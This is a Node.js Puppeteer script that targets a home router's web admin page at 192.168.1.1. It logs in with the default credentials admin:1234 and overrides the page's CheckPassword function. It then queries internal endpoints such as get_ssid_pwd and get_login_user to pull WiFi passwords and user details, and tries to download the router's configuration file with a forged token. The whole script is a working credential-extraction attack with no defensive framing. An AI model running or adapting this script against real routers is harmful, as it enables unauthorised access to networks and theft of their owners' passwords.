const PUPPETEER = require('puppeteer');
const ROUTER = 'https://192.168.1.1';
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

(async () => {
  const b = await PUPPETEER.launch({headless: false, ignoreHTTPSErrors: true, args: ['--no-sandbox', '--ignore-certificate-errors', '--window-size=1280,720']});
  const p = await b.newPage();

  // Intercept XHR responses
  p.on('response', async res => {
    const url = res.url();
    if (url.includes('get_band') || url.includes('wifi_status') || url.includes('get_login') || url.includes('cfgfile')) {
      try {
        const txt = await res.text();
        console.log(`XHR ${url.substring(0,80)}: ${txt.substring(0, 500)}`);
      } catch(e) {}
    }
  });

  // Login as admin:1234
  await p.goto(ROUTER + '/html/login_pldt.html', {waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true});
  await sleep(2000);
  await p.evaluate(() => {
    window.CheckPassword = () => 0;
    document.getElementById('user_name').value = 'admin';
    document.getElementById('loginpp').value = '1234';
  });
  await sleep(500);
  await p.evaluate(() => document.getElementById('login_btn').click());
  await sleep(5000);

  console.log('Logged in. URL:', p.url());

  // Now from the password change page, make XHR calls to get WiFi data
  const xhrEndpoints = [
    'get_bandSteering_wlan',
    'get_wifi_status',
    'get_wifi_status_5G',
    'get_login_user',
    'get_ssid_pwd',  // common in PLDT firmware
  ];

  for (const ep of xhrEndpoints) {
    console.log(`\n--- Calling XHR endpoint: ${ep} ---`);
    try {
      const result = await p.evaluate(async (endpoint) => {
        return new Promise((resolve) => {
          const xhr = new XMLHttpRequest();
          xhr.open('GET', '/' + endpoint, true);
          xhr.onload = () => resolve({status: xhr.status, text: xhr.responseText.substring(0, 1000)});
          xhr.onerror = () => resolve({error: 'Network error'});
          xhr.send();
        });
      }, ep);
      console.log(JSON.stringify(result));
    } catch(e) {
      console.log('Error:', e.message);
    }
  }

  // Also try the XHR mechanism used by the password page
  console.log('\n--- Trying XHR via page XHR object ---');
  const xhrResult = await p.evaluate(async () => {
    try {
      // Try using the XHR utility on the page
      if (typeof XHR !== 'undefined' && XHR.get) {
        const result = await new Promise((resolve) => {
          XHR.get('get_bandSteering_wlan', null, (data) => resolve(JSON.stringify(data)));
        });
        return {method: 'XHR.get', data: result.substring(0, 1000)};
      }
    } catch(e) {
      return {error: e.message};
    }
    return {error: 'XHR not available'};
  });
  console.log('XHR result:', JSON.stringify(xhrResult));

  // Try direct fetch to config download
  console.log('\n--- Trying config download from password page ---');
  const cfgResult = await p.evaluate(async () => {
    try {
      const r = await fetch('/html/ssmp/cfgfile/cfgfiledown.cgi?&RequestFile=html/ssmp/cfgfile/cfgfile.asp', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'x.X_HW_Token=0',
        credentials: 'include'
      });
      if (r.ok) return {status: r.status, text: (await r.text()).substring(0, 500)};
      return {status: r.status, text: (await r.text()).substring(0, 200)};
    } catch(e) {
      return {error: e.message};
    }
  });
  console.log('Config download result:', JSON.stringify(cfgResult));

  await b.close();
})();
